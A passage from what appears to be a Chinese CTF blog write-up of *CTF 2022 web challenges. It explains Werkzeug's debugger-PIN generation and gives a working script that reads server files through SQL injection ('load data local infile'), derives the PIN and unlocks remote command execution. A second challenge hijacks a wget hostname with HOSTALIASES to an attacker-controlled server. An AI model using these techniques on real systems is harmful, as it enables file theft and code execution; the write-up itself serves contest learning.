+            <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/proc/self/cgroup"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
+                linux <span class="token operator">+=</span> f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rpartition<span class="token punctuation">(</span><span class="token string">b"/"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>
+        <span class="token keyword">except</span> OSError<span class="token punctuation">:</span>
+            <span class="token keyword">pass</span>
+
+        <span class="token keyword">if</span> linux<span class="token punctuation">:</span>
+            <span class="token keyword">return</span> linux
+
+        <span class="token comment"># On OS X, use ioreg to get the computer's serial number.</span>
+        <span class="token keyword">try</span><span class="token punctuation">:</span>
+            <span class="token comment"># subprocess may not be available, e.g. Google App Engine</span>
+            <span class="token comment"># https://github.com/pallets/werkzeug/issues/925</span>
+            <span class="token keyword">from</span> subprocess <span class="token keyword">import</span> Popen<span class="token punctuation">,</span> PIPE
+
+            dump <span class="token operator">=</span> Popen<span class="token punctuation">(</span>
+                <span class="token punctuation">[</span><span class="token string">"ioreg"</span><span class="token punctuation">,</span> <span class="token string">"-c"</span><span class="token punctuation">,</span> <span class="token string">"IOPlatformExpertDevice"</span><span class="token punctuation">,</span> <span class="token string">"-d"</span><span class="token punctuation">,</span> <span class="token string">"2"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>PIPE
+            <span class="token punctuation">)</span><span class="token punctuation">.</span>communicate<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
+            <span class="token keyword">match</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'"serial-number" = &lt;([^>]+)'</span><span class="token punctuation">,</span> dump<span class="token punctuation">)</span>
+
+            <span class="token keyword">if</span> <span class="token keyword">match</span> <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
+                <span class="token keyword">return</span> <span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+        <span class="token keyword">except</span> <span class="token punctuation">(</span>OSError<span class="token punctuation">,</span> ImportError<span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token keyword">pass</span>
+
+        <span class="token comment"># On Windows, use winreg to get the machine guid.</span>
+        <span class="token keyword">if</span> sys<span class="token punctuation">.</span>platform <span class="token operator">==</span> <span class="token string">"win32"</span><span class="token punctuation">:</span>
+            <span class="token keyword">import</span> winreg
+
+            <span class="token keyword">try</span><span class="token punctuation">:</span>
+                <span class="token keyword">with</span> winreg<span class="token punctuation">.</span>OpenKey<span class="token punctuation">(</span>
+                    winreg<span class="token punctuation">.</span>HKEY_LOCAL_MACHINE<span class="token punctuation">,</span>
+                    <span class="token string">"SOFTWARE\\Microsoft\\Cryptography"</span><span class="token punctuation">,</span>
+                    <span class="token number">0</span><span class="token punctuation">,</span>
+                    winreg<span class="token punctuation">.</span>KEY_READ <span class="token operator">|</span> winreg<span class="token punctuation">.</span>KEY_WOW64_64KEY<span class="token punctuation">,</span>
+                <span class="token punctuation">)</span> <span class="token keyword">as</span> rk<span class="token punctuation">:</span>
+                    guid<span class="token punctuation">:</span> t<span class="token punctuation">.</span>Union<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">]</span>
+                    guid_type<span class="token punctuation">:</span> <span class="token builtin">int</span>
+                    guid<span class="token punctuation">,</span> guid_type <span class="token operator">=</span> winreg<span class="token punctuation">.</span>QueryValueEx<span class="token punctuation">(</span>rk<span class="token punctuation">,</span> <span class="token string">"MachineGuid"</span><span class="token punctuation">)</span>
+
+                    <span class="token keyword">if</span> guid_type <span class="token operator">==</span> winreg<span class="token punctuation">.</span>REG_SZ<span class="token punctuation">:</span>
+                        <span class="token keyword">return</span> guid<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>
+
+                    <span class="token keyword">return</span> guid
+            <span class="token keyword">except</span> OSError<span class="token punctuation">:</span>
+                <span class="token keyword">pass</span>
+
+        <span class="token keyword">return</span> <span class="token boolean">None</span>
+
+    _machine_id <span class="token operator">=</span> _generate<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> _machine_id</code></pre>
+
+<p>看前两段</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">global</span> _machine_id
+
+    <span class="token keyword">if</span> _machine_id <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> _machine_id</code></pre>
+
+<p>如果有了<code>_machine_id</code>就直接返回，网上第一种说法就是直接用<code>machine_id</code>生成，但是找了下这个变量的地址，在这个函数倒数第二行，<code>_machine_id = _generate()</code>，也就是说只是为了防止重复生成所以在开头写的这一段逻辑，并不是说直接用<code>machine_id</code>生成</p>
+<p>接着往下看</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">_generate</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> t<span class="token punctuation">.</span>Optional<span class="token punctuation">[</span>t<span class="token punctuation">.</span>Union<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
+    linux <span class="token operator">=</span> <span class="token string">b""</span>
+
+    <span class="token comment"># machine-id is stable across boots, boot_id is not.</span>
+    <span class="token keyword">for</span> filename <span class="token keyword">in</span> <span class="token string">"/etc/machine-id"</span><span class="token punctuation">,</span> <span class="token string">"/proc/sys/kernel/random/boot_id"</span><span class="token punctuation">:</span>
+        <span class="token keyword">try</span><span class="token punctuation">:</span>
+            <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
+                value <span class="token operator">=</span> f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token keyword">except</span> OSError<span class="token punctuation">:</span>
+            <span class="token keyword">continue</span>
+
+        <span class="token keyword">if</span> value<span class="token punctuation">:</span>
+            linux <span class="token operator">+=</span> value
+            <span class="token keyword">break</span></code></pre>
+
+<p>根据逻辑可知，<code>value = f.readline().strip()</code>，即这里读到了<code>/etc/machine-id</code>后就break了</p>
+<p>继续</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># Containers share the same machine id, add some cgroup</span>
+<span class="token comment"># information. This is used outside containers too but should be</span>
+<span class="token comment"># relatively stable across boots.</span>
+<span class="token keyword">try</span><span class="token punctuation">:</span>
+    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/proc/self/cgroup"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
+        linux <span class="token operator">+=</span> f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rpartition<span class="token punctuation">(</span><span class="token string">b"/"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>
+<span class="token keyword">except</span> OSError<span class="token punctuation">:</span>
+    <span class="token keyword">pass</span>
+
+<span class="token keyword">if</span> linux<span class="token punctuation">:</span>
+    <span class="token keyword">return</span> linux</code></pre>
+
+<p>读了<code>/proc/self/cgroup</code>，然后加了<code>/</code>后的数据，根据读到的情况有三种，分别如下</p>
+<p><code>0::/system.slice/containerd.service    </code></p>
+<p><code>10:memory:/docker/6c8595fc16c3b824397356dbff734dcd09090a39e99188df0f26289cf7c11f15 </code></p>
+<p><code>5:rdma:/    </code></p>
+<p>实际上我读的数据是根据ascii序列排序过的，实际上如下</p>
+<img src="/article/starctf2022/image-20220421133739605.png" class="" title="image-20220421133739605" loading="lazy">
+
+<p>但即使出错也没关系，因为如果读不到<code>f.readline().strip().rpartition(b&quot;/&quot;)[2]</code>，它会pass掉，继续往下读，所以最后读到的就是<code>docker/</code>后的值，也就是<code>/etc/machine-id</code>+<code>/proc/self/cgroup</code>里<code>docker/</code>后的值</p>
+<p>然后就利用生成脚本生成PIN码，这里注意题目还有个改动，这里利用的是sha1的update，不是md5，<code>h = hashlib.sha1()</code></p>
+<h3 id="写了一键构造脚本如下"><a href="#写了一键构造脚本如下" class="headerlink" title="写了一键构造脚本如下"></a>写了一键构造脚本如下</h3><pre class="language-Python" data-language="Python"><code class="language-Python">&quot;&quot;&quot;
+
+-*- coding: utf-8 -*-
+
+@File: getPin.py
+
+@Author: Err0r
+
+&quot;&quot;&quot;
+
+import random
+
+import string
+
+import uuid
+
+
+
+import requests
+
+
+
+&quot;&quot;&quot;
+
+&#x2F;etc&#x2F;machine-id
+
+1cc402dd0e11d5ae18db04a6de87223d
+
+
+
+&#x2F;proc&#x2F;self&#x2F;cgroup
+
++---------------------------------------------------------------------------------------------+
+
+| 0::&#x2F;system.slice&#x2F;containerd.service                                                         |
+
+| 10:memory:&#x2F;docker&#x2F;6c8595fc16c3b824397356dbff734dcd09090a39e99188df0f26289cf7c11f15          |
+
+| 11:freezer:&#x2F;docker&#x2F;6c8595fc16c3b824397356dbff734dcd09090a39e99188df0f26289cf7c11f15         |
+
+| 12:cpuset:&#x2F;docker&#x2F;6c8595fc16c3b824397356dbff734dcd09090a39e99188df0f26289cf7c11f15          |
+
+| 1:name&#x3D;systemd:&#x2F;docker&#x2F;6c8595fc16c3b824397356dbff734dcd09090a39e99188df0f26289cf7c11f15     |
+
+| 2:hugetlb:&#x2F;docker&#x2F;6c8595fc16c3b824397356dbff734dcd09090a39e99188df0f26289cf7c11f15          |
+
+| 3:net_cls,net_prio:&#x2F;docker&#x2F;6c8595fc16c3b824397356dbff734dcd09090a39e99188df0f26289cf7c11f15 |
+
+| 4:perf_event:&#x2F;docker&#x2F;6c8595fc16c3b824397356dbff734dcd09090a39e99188df0f26289cf7c11f15       |
+
+| 5:rdma:&#x2F;                                                                                    |
+
+| 6:pids:&#x2F;docker&#x2F;6c8595fc16c3b824397356dbff734dcd09090a39e99188df0f26289cf7c11f15             |
+
+| 7:cpu,cpuacct:&#x2F;docker&#x2F;6c8595fc16c3b824397356dbff734dcd09090a39e99188df0f26289cf7c11f15      |
+
+| 8:devices:&#x2F;docker&#x2F;6c8595fc16c3b824397356dbff734dcd09090a39e99188df0f26289cf7c11f15          |
+
+| 9:blkio:&#x2F;docker&#x2F;6c8595fc16c3b824397356dbff734dcd09090a39e99188df0f26289cf7c11f15            |
+
++---------------------------------------------------------------------------------------------+
+
+
+
+
+
+&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_id
+
+a67fd832-a114-48c4-9ff7-161438b262dc
+
+
+
+&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address
+
+02:42:c0:a8:d0:03
+
+
+
+fuxk
+
+&quot;&quot;&quot;
+
+import hashlib
+
+from itertools import chain
+
+
+
+url &#x3D; &quot;http:&#x2F;&#x2F;123.60.72.85:5002&#x2F;view&quot;
+
+
+
+session &#x3D; requests.session()
+
+
+
+cookies &#x3D; &#123;
+
+    &quot;session&quot;: &quot;eyJjc3JmX3Rva2VuIjoiNTIzYzk1ODJkMDY3YzU0Yjk5YmZjMjgyNGVlODgyYWZkNmFkZDgwOCIsInVzZXJuYW1lIjoiYTwvYT48c2NyaXB0PmFsZXJ0KDEpOzwvc2NyaXB0PjxhPiJ9.YlpCjg.o3nmen81K8VdxHDT-4lrydruCMQ&quot;
+
+&#125;
+
+
+
+
+
+def getPin(uuid, machine_id, username&#x3D;&#39;root&#39;, modname&#x3D;&#39;flask.app&#39;, className&#x3D;&#39;Flask&#39;,
+
+           file&#x3D;&#39;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.8&#x2F;site-packages&#x2F;flask&#x2F;app.py&#39;):
+
+    probably_public_bits &#x3D; [
+
+        username,  # username
+
+        modname,  # modname
+
+        className,  # getattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;))
+
+        file  # getattr(mod, &#39;__file__&#39;, None),
+
+    ]
+
+
+
+    private_bits &#x3D; [
+
+        uuid,  # str(uuid.getnode()),  &#x2F;sys&#x2F;class&#x2F;net&#x2F;ens33&#x2F;address
+
+        machine_id  # get_machine_id(), &#x2F;etc&#x2F;machine-id
+
+    ]
+
+
+
+    h &#x3D; hashlib.sha1()
+
+    for bit in chain(probably_public_bits, private_bits):
+
+        if not bit:
+
+            continue
+
+        if isinstance(bit, str):
+
+            bit &#x3D; bit.encode(&#39;utf-8&#39;)
+
+        h.update(bit)
+
+    h.update(b&#39;cookiesalt&#39;)
+
+
+
+    cookie_name &#x3D; &#39;__wzd&#39; + h.hexdigest()[:20]
+
+
+
+    num &#x3D; None
+
+    if num is None:
+
+        h.update(b&#39;pinsalt&#39;)
+
+        num &#x3D; (&#39;%09d&#39; % int(h.hexdigest(), 16))[:9]
+
+
+
+    rv &#x3D; None
+
+    if rv is None:
+
+        for group_size in 5, 4, 3:
+
+            if len(num) % group_size &#x3D;&#x3D; 0:
+
+                rv &#x3D; &#39;-&#39;.join(num[x:x + group_size].rjust(group_size, &#39;0&#39;)
+
+                              for x in range(0, len(num), group_size))
+
+                break
+
+        else:
+
+            rv &#x3D; num
+
+
+
+    print(rv)
+
+    return rv
+
+
+
+
+
+def createTable(file):
+
+    tablename &#x3D; &#39;&#39;.join(random.sample(string.ascii_letters + string.digits, 8))
+
+    paramsGet &#x3D; &#123;
+
+        &quot;note_id&quot;: f&quot;-1&#39;;create table &#123;tablename&#125;(cmd text);load data local infile &#39;&#123;file&#125;&#39; into table &#123;tablename&#125; fields terminated by &#39;\\n&#39;;\x23&quot;&#125;
+
+    res &#x3D; session.get(url, params&#x3D;paramsGet, cookies&#x3D;cookies)
+
+    # print(tablename)
+
+    return tablename
+
+
+
+
+
+def readtable(tablename):
+
+    paramsGet &#x3D; &#123;&quot;note_id&quot;: f&quot;0&#39; union select 1,2,3,4,(select group_concat(concat_ws(0x7e,cmd)) from &#123;tablename&#125;)\x23&quot;&#125;
+
+    response &#x3D; session.get(url, params&#x3D;paramsGet, cookies&#x3D;cookies)
+
+    response &#x3D; response.content.split(b&#39;&lt;h1 style&#x3D;&quot;text-align: center&quot;&gt;\n&#39;)[1].split(b&quot;\n&quot;)[0][8:]
+
+    # print(response)
+
+    return response
+
+
+
+
+
+def check(pin):
+
+    res &#x3D; session.get(url, cookies&#x3D;cookies).text
+
+    s &#x3D; res.split(&quot;SECRET &#x3D; \&quot;&quot;)[1].split(&quot;\&quot;;&quot;)[0]
+
+    paramsGet &#x3D; &#123;
+
+        &quot;__debugger__&quot;: &quot;yes&quot;,
+
+        &quot;cmd&quot;: &quot;pinauth&quot;,
+
+        &quot;s&quot;: s,
+
+        &quot;pin&quot;: pin
+
+    &#125;
+
+    response &#x3D; session.get(url, params&#x3D;paramsGet, cookies&#x3D;cookies)
+
+    print(response.text)
+
+
+
+
+
+if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
+
+    getmac &#x3D; createTable(&quot;&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address&quot;)
+
+    getmac &#x3D; str(int(readtable(getmac).decode().replace(&quot;:&quot;, &quot;&quot;), 16))
+
+    print(getmac)
+
+
+
+    getCgroup &#x3D; createTable(&quot;&#x2F;proc&#x2F;self&#x2F;cgroup&quot;)
+
+    getCgroup &#x3D; str(readtable(getCgroup).decode().split(&quot;&#x2F;&quot;)[2].split(&quot;,&quot;)[0])
+
+    print(getCgroup)
+
+
+
+    getMachineId &#x3D; createTable(&quot;&#x2F;etc&#x2F;machine-id&quot;)
+
+    getMachineId &#x3D; str(readtable(getMachineId).decode())
+
+    print(getMachineId)
+
+
+
+    getBootId &#x3D; createTable(&quot;&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_id&quot;)
+
+    getBootId &#x3D; str(readtable(getBootId).decode())
+
+    print(getBootId)
+
+
+
+    # etcPasswd &#x3D; createTable(&quot;&#x2F;etc&#x2F;passwd&quot;)
+
+    # etcPasswd &#x3D; str(readtable(etcPasswd).decode()).split(&quot;,&quot;)
+
+    # users &#x3D; []
+
+    # for i in etcPasswd:
+
+    #     users.append(i.split(&quot;:&quot;)[0])
+
+    # print(users)
+
+
+
+    users &#x3D; [&#39;ctf&#39;]
+
+    for i in users:
+
+        print(i)
+
+        # pin1 &#x3D; getPin(getmac, getMachineId, username&#x3D;i)
+
+        # check(pin1)
+
+        #
+
+        # pin2 &#x3D; getPin(getmac, getCgroup, username&#x3D;i)
+
+        # check(pin2)
+
+
+
+        # pin3 &#x3D; getPin(getmac, getBootId+getCgroup, username&#x3D;i)
+
+        # check(pin3)
+
+
+
+        pin4 &#x3D; getPin(getmac, getMachineId+getCgroup, username&#x3D;i)
+
+        check(pin4)</code></pre>
+
+<img src="/article/starctf2022/(null)-20220421125559691.(null)" class="" title="img" loading="lazy">
+
+<p>拿到pin码解锁，然后执行命令</p>
+<img src="/article/starctf2022/(null)-20220421125600275.(null)" class="" title="img" loading="lazy">
+
+<p>根目录执行&#x2F;readflag</p>
+<img src="/article/starctf2022/(null)-20220421125559899.(null)" class="" title="img" loading="lazy">
+
+<hr>
+<h2 id="oh-my-lotto"><a href="#oh-my-lotto" class="headerlink" title="oh-my-lotto"></a>oh-my-lotto</h2><p>下载附件审计源码可以发现一个文件上传，保存为 <code>/app/guess/forecast.txt</code>。同时在通过如下 check 的情况下可以设置环境变量。</p>
+<pre class="language-Python" data-language="Python"><code class="language-Python">def safe_check(s):
+
+    if &#39;LD&#39; in s or &#39;HTTP&#39; in s or &#39;BASH&#39; in s or &#39;ENV&#39; in s or &#39;PROXY&#39; in s or &#39;PS&#39; in s: 
+
+        return False
+
+    return True</code></pre>
+
+<p>设定好环境变量后执行如下逻辑。</p>
+<pre class="language-Python" data-language="Python"><code class="language-Python">try:
+
+    os.system(&#39;wget --content-disposition -N lotto&#39;)
+
+
+
+    if os.path.exists(&quot;&#x2F;app&#x2F;lotto_result.txt&quot;):
+
+        lotto_result &#x3D; open(&quot;&#x2F;app&#x2F;lotto_result.txt&quot;, &#39;rb&#39;).read()
+
+    else:
+
+        lotto_result &#x3D; &#39;result&#39;
+
+    if os.path.exists(&quot;&#x2F;app&#x2F;guess&#x2F;forecast.txt&quot;):
+
+        forecast &#x3D; open(&quot;&#x2F;app&#x2F;guess&#x2F;forecast.txt&quot;, &#39;rb&#39;).read()
+
+    else:
+
+        forecast &#x3D; &#39;forecast&#39;
+
+
+
+    if forecast &#x3D;&#x3D; lotto_result:
+
+        return flag
+
+    else:
+
+        message &#x3D; &#39;Sorry forecast failed, maybe lucky next time!&#39;
+
+        return render_template(&#39;lotto.html&#39;, message&#x3D;message)
+
+except Exception as e:
+
+    message &#x3D; &#39;Lotto Error!&#39;
+
+    return render_template(&#39;lotto.html&#39;, message&#x3D;message)</code></pre>
+
+<p>wget 处采用了 hostname 的方式，此时只要劫持到 lotto 即可实现任意文件下载。因此设置环境变量如下。</p>
+<pre class="language-Bash" data-language="Bash"><code class="language-Bash">HOSTALIASES&#x3D;&#x2F;app&#x2F;guess&#x2F;forecast.txt</code></pre>
+
+<img src="/article/starctf2022/(null)-20220421125601129.(null)" class="" title="img" loading="lazy">
+
+<p>将文件内容设置如下。</p>
+<pre class="language-CSS" data-language="CSS"><code class="language-CSS">lotto lottod.lemonprefect.cn</code></pre>
+
+<img src="/article/starctf2022/(null)-20220421125600612.(null)" class="" title="img" loading="lazy">
+
+<p>此时 lotto 的解析即可被劫持到 <code>lottod.lemonprefect.cn</code>。将如下 nginx 反代配置好。</p>
+<pre class="language-Nginx" data-language="Nginx"><code class="language-Nginx">server
+
+    &#123;
+
+        listen 80;
+
+        #listen [::]:80;
+
+        server_name lottod.lemonprefect.cn lotto;
+
+        index index.html index.htm index.php default.html default.htm default.php;
+
+        root  &#x2F;home&#x2F;wwwroot&#x2F;lottod.lemonprefect.cn;
+
+        location &#x2F;
+
+        &#123;
+
+                proxy_pass http:&#x2F;&#x2F;localhost:8068;
+
+        &#125;
+
+        location ~ &#x2F;.well-known &#123;
+
+            allow all;
+
+        &#125;
+
+        location ~ &#x2F;\.
+
+        &#123;
+
+            deny all;
+
+        &#125;
+
+        access_log  &#x2F;home&#x2F;wwwlogs&#x2F;lottod.lemonprefect.cn.log;
+
+    &#125;</code></pre>
+
+<p>在对应端口运行如下程序。</p>
+<pre class="language-Python" data-language="Python"><code class="language-Python">from flask import Flask, make_response
+
+import secrets
+
+
+
+app &#x3D; Flask(__name__)
+
+
+
+@app.route(&quot;&#x2F;&quot;)
+
+def index():
+
+    r &#x3D; &quot;lotto lottod.lemonprefect.cn&quot;
+
+    response &#x3D; make_response(r)
+
+    response.headers[&#39;Content-Type&#39;] &#x3D; &#39;text&#x2F;plain&#39;
+
+    response.headers[&#39;Content-Disposition&#39;] &#x3D; &#39;attachment; filename&#x3D;lotto_result.txt&#39;
+
+    return response
+
+
+
+if __name__ &#x3D;&#x3D; &quot;__main__&quot;:
+
+    app.run(debug&#x3D;True, host&#x3D;&#39;0.0.0.0&#39;, port&#x3D;8068)</code></pre>
+
+<p>即可同时达成劫持与内容相等，获得 flag。</p>
+<img src="/article/starctf2022/(null)-20220421125559634.(null)" class="" title="img" loading="lazy">
+
+<hr>
+<p>其他方向的题目由于我没做就不写啦</p>
+</div></section><div id="reward-container"><span class="hty-icon-button button-glow" id="reward-button" title="打赏" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === &quot;none&quot;) ? &quot;block&quot; : &quot;none&quot;;"><span class="icon iconify" data-icon="ri:hand-coin-line"></span></span><div id="reward-comment">I'm so cute. Please give me money.</div></div><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>Err0r</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="https://err0r.top/article/starctf2022/" title="starctf2022">https://err0r.top/article/starctf2022/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><span class="icon iconify" data-icon="ri:creative-commons-line"></span><span class="icon iconify" data-icon="ri:creative-commons-by-line"></span><span class="icon iconify" data-icon="ri:creative-commons-nc-line"></span><span class="icon iconify" data-icon="ri:creative-commons-sa-line"></span></a> 许可协议。</li></ul></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/article/penetrationtest/" rel="prev" title="记一次教师机环境的渗透"><span class="icon iconify" data-icon="ri:arrow-left-s-line"></span><span class="post-nav-text">记一次教师机环境的渗透</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/article/socket/" rel="next" title="Socket网络通信编程项目"><span class="post-nav-text">Socket网络通信编程项目</span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2019 – 2023 </span><span class="with-love" id="animate"><span class="icon iconify" data-icon="ri:cloud-line"></span></span><span class="author"> Err0r</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v6.3.0</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.10.9</span></div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><!-- hexo-inject:begin --><!-- hexo-inject:end --></body></html>
